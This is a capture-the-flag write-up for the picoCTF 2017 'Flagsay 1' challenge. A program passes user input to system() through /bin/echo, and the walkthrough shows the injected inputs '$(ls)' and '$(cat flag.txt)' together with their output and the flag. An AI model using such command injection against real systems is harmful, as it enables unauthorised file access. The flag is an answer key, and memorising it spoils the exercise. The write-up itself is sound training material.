# Flagsay 1
## level 2 - binary exploitation

### Description
> I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](./data/flagsay-1)! [Source](./data/flagsay-1.c). Connect on shell2017.picoctf.com:12442.

### Hints
> * System will run exactly what the program gives it

### Solution

Connect with `nc` and prompt some string:

```
$ nc shell2017.picoctf.com 12442
hello
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //hello                              /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
```

A flag with our string will be printed. Let's look at the source how it's done: we don't have a `printf` function to show on screen, instead it calls `system` with `/bin/echo` and the flag string as parameter. As the hint suggests the software didn't any validation on input, so we can evaluate commands into `echo`:

```
$ nc shell2017.picoctf.com 12442
$(ls)
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //flagsay-1
flagsay-1_no_aslr
flag.txt
xinetd_wrapper.sh                              /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
```

Now we have the list of files in current folder, just `cat` the flag out:

```
nc shell2017.picoctf.com 12442
$(cat flag.txt)
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //6116b5c621137949e3f70fd31f7cc29a                    /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
```

### Flag
```
6116b5c621137949e3f70fd31f7cc29a
```